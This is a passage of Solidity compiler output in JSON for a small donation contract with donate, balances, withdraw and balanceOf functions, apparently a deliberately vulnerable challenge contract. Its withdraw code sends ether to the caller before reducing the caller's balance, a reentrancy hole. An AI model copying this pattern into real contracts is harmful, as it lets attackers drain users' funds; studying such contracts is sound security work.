							"object": "608060405234801561001057600080fd5b5061044a806100206000396000f3fe6080604052600436106100425760003560e01c8062362a951461004e57806327e235e3146100925780632e1a7d4d146100f757806370a082311461013257610049565b3661004957005b600080fd5b6100906004803603602081101561006457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610197565b005b34801561009e57600080fd5b506100e1600480360360208110156100b557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061022d565b6040518082815260200191505060405180910390f35b34801561010357600080fd5b506101306004803603602081101561011a57600080fd5b8101908080359060200190929190505050610245565b005b34801561013e57600080fd5b506101816004803603602081101561015557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610344565b6040518082815260200191505060405180910390f35b6101e8346000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461038c90919063ffffffff16565b6000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b60006020528060005260406000206000915090505481565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054106103415760003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d80600081146102ea576040519150601f19603f3d011682016040523d82523d6000602084013e6102ef565b606091505b50509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550505b50565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008082840190508381101561040a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fea2646970667358221220cc5806491c2f51c40f3ffffaf6c376a5017dd05188846344fe641e387702614564736f6c63430006000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x44A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x362A95 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x92 JUMPI DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0xF7 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x132 JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x90 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x197 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xB5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x22D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x103 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x130 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x11A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x245 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x181 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x155 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x344 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E8 CALLVALUE PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x38C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT PUSH2 0x341 JUMPI PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x2EA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x2EF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP2 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x40A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCC PC MOD 0x49 SHR 0x2F MLOAD 0xC4 0xF EXTCODEHASH SELFDESTRUCT STATICCALL 0xF6 0xC3 PUSH23 0xA5017DD05188846344FE641E387702614564736F6C6343 STOP MOD STOP STOP CALLER ",
							"sourceMap": "139:578:1:-:0;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;139:578:1;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "6080604052600436106100425760003560e01c8062362a951461004e57806327e235e3146100925780632e1a7d4d146100f757806370a082311461013257610049565b3661004957005b600080fd5b6100906004803603602081101561006457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610197565b005b34801561009e57600080fd5b506100e1600480360360208110156100b557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061022d565b6040518082815260200191505060405180910390f35b34801561010357600080fd5b506101306004803603602081101561011a57600080fd5b8101908080359060200190929190505050610245565b005b34801561013e57600080fd5b506101816004803603602081101561015557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610344565b6040518082815260200191505060405180910390f35b6101e8346000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461038c90919063ffffffff16565b6000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b60006020528060005260406000206000915090505481565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054106103415760003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d80600081146102ea576040519150601f19603f3d011682016040523d82523d6000602084013e6102ef565b606091505b50509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550505b50565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008082840190508381101561040a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fea2646970667358221220cc5806491c2f51c40f3ffffaf6c376a5017dd05188846344fe641e387702614564736f6c63430006000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x362A95 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x92 JUMPI DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0xF7 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x132 JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x90 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x197 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xB5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x22D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x103 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x130 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x11A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x245 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x181 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x155 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x344 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E8 CALLVALUE PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x38C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT PUSH2 0x341 JUMPI PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x2EA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x2EF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP2 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x40A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCC PC MOD 0x49 SHR 0x2F MLOAD 0xC4 0xF EXTCODEHASH SELFDESTRUCT STATICCALL 0xF6 0xC3 PUSH23 0xA5017DD05188846344FE641E387702614564736F6C6343 STOP MOD STOP STOP CALLER ",
							"sourceMap": "139:578:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;241:99;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;241:99:1;;;;;;;;;;;;;;;;;;;:::i;:::-;;196:40;;8:9:-1;5:2;;;30:1;27;20:12;5:2;196:40:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;196:40:1;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;448:234;;8:9:-1;5:2;;;30:1;27;20:12;5:2;448:234:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;448:234:1;;;;;;;;;;;;;;;;;:::i;:::-;;344:100;;8:9:-1;5:2;;;30:1;27;20:12;5:2;344:100:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;344:100:1;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;241:99;307:28;325:9;307:8;:13;316:3;307:13;;;;;;;;;;;;;;;;:17;;:28;;;;:::i;:::-;291:8;:13;300:3;291:13;;;;;;;;;;;;;;;:44;;;;241:99;:::o;196:40::-;;;;;;;;;;;;;;;;;:::o;448:234::-;520:7;496:8;:20;505:10;496:20;;;;;;;;;;;;;;;;:31;493:185;;538:11;554:10;:15;;576:7;554:34;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;537:51:1;;;664:7;640:8;:20;649:10;640:20;;;;;;;;;;;;;;;;:31;;;;;;;;;;;493:185;;448:234;:::o;344:100::-;398:12;425:8;:14;434:4;425:14;;;;;;;;;;;;;;;;418:21;;344:100;;;:::o;2690:175:2:-;2748:7;2767:9;2783:1;2779;:5;2767:17;;2807:1;2802;:6;;2794:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2857:1;2850:8;;;2690:175;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "219600",
								"executionCost": "263",
								"totalCost": "219863"
							},
							"external": {
								"balanceOf(address)": "1240",
								"balances(address)": "1169",
								"donate(address)": "infinite",
								"withdraw(uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 139,
									"end": 717,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "MSTORE"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "POP"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "DUP1"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "CODECOPY"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 139,
									"end": 717,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220cc5806491c2f51c40f3ffffaf6c376a5017dd05188846344fe641e387702614564736f6c63430006000033",
									".code": [
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "MSTORE"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "LT"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "SHR"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "362A95"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "27E235E3"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "2E1A7D4D"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "JUMP"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "JUMPDEST"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "STOP"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "JUMPDEST"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 717,
											"name": "REVERT"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "JUMPDEST"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "DUP1"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "DUP2"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "ADD"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "SWAP1"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "DUP1"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "DUP1"
										},
										{
											"begin": 241,
